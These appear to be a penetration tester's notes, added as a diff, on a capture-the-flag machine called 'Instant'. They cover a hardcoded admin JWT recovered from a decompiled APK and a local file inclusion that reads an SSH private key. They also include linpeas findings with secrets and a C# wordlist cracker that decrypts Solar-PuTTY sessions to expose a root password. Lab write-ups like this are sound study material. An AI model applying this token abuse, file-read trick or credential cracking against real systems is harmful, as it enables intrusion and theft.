@@ -1,0 +1,210 @@
+ports: 22, 80
+
+download apk from 80
+
+run jadx
+	http://mywalletv1.instant.htb
+
+        new OkHttpClient()
+		.newCall(new Request.Builder()
+		.url("http://mywalletv1.instant.htb/api/v1/view/profile")
+		.addHeader("Authorization",
+			"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA")
+		.build())
+		.enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
+
+		this is from a function TestAdminAuthorization and has pemanent admin token?
+
+		response from this endpoint:
+
+				"Profile": {
+					"account_status": "active",
+					"email": "admin@instant.htb",
+					"invite_token": "instant_admin_inv",
+					"role": "Admin",
+					"username": "instantAdmin",
+					"wallet_balance": "10000000",
+					"wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
+				},
+				"Status": 200
+
+	by grepping this domain we get http://swagger-ui.instant.htb
+
+
+	response of http://mywalletv1.instant.htb/api/v1/admin/list/users:
+		{
+		  "Status": 200,
+		  "Users": [
+		    {
+		      "email": "admin@instant.htb",
+		      "role": "Admin",
+		      "secret_pin": 87348,
+		      "status": "active",
+		      "username": "instantAdmin",
+		      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
+		    },
+		    {
+		      "email": "shirohige@instant.htb",
+		      "role": "instantian",
+		      "secret_pin": 42845,
+		      "status": "active",
+		      "username": "shirohige",
+		      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
+		    },
+		    {
+		      "email": "b@instant.htb",
+		      "role": "instantian",
+		      "secret_pin": 12345,
+		      "status": "active",
+		      "username": "aa",
+		      "wallet_id": "508b2340-5176-4642-b871-248b14c61113"
+		    },
+		    {
+		      "email": "olegkakoleg@oleg.oleg",
+		      "role": "instantian",
+		      "secret_pin": 12345,
+		      "status": "active",
+		      "username": "oleg",
+		      "wallet_id": "d491944b-c87e-4091-bcce-28e0013789d8"
+		    },
+		    {
+		      "email": "string",
+		      "role": "instantian",
+		      "secret_pin": 12345,
+		      "status": "active",
+		      "username": "asd",
+		      "wallet_id": "57700ca7-5311-4c90-8db8-919d24dd7970"
+		    },
+		    {
+		      "email": "paul",
+		      "role": "instantian",
+		      "secret_pin": 12345,
+		      "status": "active",
+		      "username": "paul",
+		      "wallet_id": "c31615f4-9e88-4661-8ffa-57cd5200f7b6"
+		    }
+		  ]
+		}
+
+
+	/api/v1/admin/view/logs:
+		{
+		  "Files": [
+		    "1.log"
+		  ],
+		  "Path": "/home/shirohige/logs/",
+		  "Status": 201
+		}
+
+	we also get an endpoint that can read a log file
+		vulnerable to lfi
+		we get user
+		we also get private key from ../.ssh/id_rsa	
+
+		
+	linpeas clues:
+		-rw-r--r-- 1 shirohige shirohige 71 Aug  8 19:34 /home/shirohige/projects/mywallet/Instant-Api/mywallet/.env
+		SECRET_KEY=VeryStrongS3cretKeyY0uC4NTGET
+		LOG_PATH=/home/shirohige/logs/
+
+		╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+		Found /home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db
+		Found /var/lib/PackageKit/transactions.d
+
+		CREATE TABLE wallet_users (
+			id INTEGER NOT NULL, 
+			username VARCHAR, 
+			email VARCHAR, 
+			wallet_id VARCHAR, 
+			password VARCHAR, 
+			create_date VARCHAR, 
+			secret_pin INTEGER, 
+			role VARCHAR, 
+			status VARCHAR, 
+			PRIMARY KEY (id), 
+			UNIQUE (username), 
+			UNIQUE (email), 
+			UNIQUE (wallet_id)
+		)
+		1, instantAdmin, admin@instant.htb, f0eca6e5-783a-471d-9d8f-0162cbc900db, pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978, 2024-07-23 00:20:52.529887, 87348, Admin, active
+
+		/opt/backups/Solar-PuTTY/sessions-backup.dat
+
+	solar putty is some kinda ssh client
+
+	sessions-backup.dat can be decrypted using this tool:
+		https://github.com/RainbowCache/solar_putty_crack/blob/main/sp_crack/SPCrack.cs
+
+		however it needs to be fixed first:
+
+			private bool Decrypt(string password) {
+			    try {
+				using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, this.salt, 1000)) {
+				    byte[] key = rfc2898DeriveBytes.GetBytes(24);
+				    using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider()) {
+					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
+					tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
+					using (ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(key, this.rgbIv)) {
+					    using (MemoryStream memoryStream = new MemoryStream(this.cyphertext)){
+						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read)) {
+						    byte[] plaintext = new byte[this.cyphertext.Length];
+						    int count = cryptoStream.Read(plaintext, 0, plaintext.Length);
+						    string plaintext_string = Encoding.UTF8.GetString(plaintext, 0, count);
+						    bool found_it = plaintext_string.All(c => char.IsLetterOrDigit(c) || char.IsWhiteSpace(c) || char.IsPunctuation(c));
+						    if(found_it) {
+							Console.WriteLine("Decrypted: " + plaintext_string);
+							return true;
+						    }
+						}
+					    }
+					}
+				    }
+				}
+			    } catch (CryptographicException) {
+				// CATCH WRONG PASSWORD ERROR HERE, OTHERWISE CRASH
+				return false;
+			    }
+			    return false;
+			}
+
+
+			public string Crack() {
+			    string result = "";
+
+			    if(!LoadSessionFile()) {
+				return result;
+			    }
+
+			    if (!File.Exists(this.wordlist_filename)) {
+				Console.WriteLine("Wordlist file not found.");
+				return result;
+			    }
+
+			    try {
+				using (StreamReader sr = new StreamReader(this.wordlist_filename)) {
+				    string? password;
+				    while ((password = sr.ReadLine()) != null) {
+					if(this.Decrypt(password)) {
+					    Console.WriteLine("Password found: " + password);
+					    result = password;
+					    break;
+					}
+				    }
+				}
+			    } catch (Exception e) {
+				Console.WriteLine("Error reading wordlist file: " + e.Message);
+			    }
+
+			    if(result.Length < 1) {
+				Console.WriteLine("No password found.");
+			    }
+
+			    return result;
+			}
+
+	we get this:
+		Decrypted: {"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
+		Password found: estrella
+
+
+	12**24nzC!r0c%q12 is the actual root password, estrella is most likely for putty 
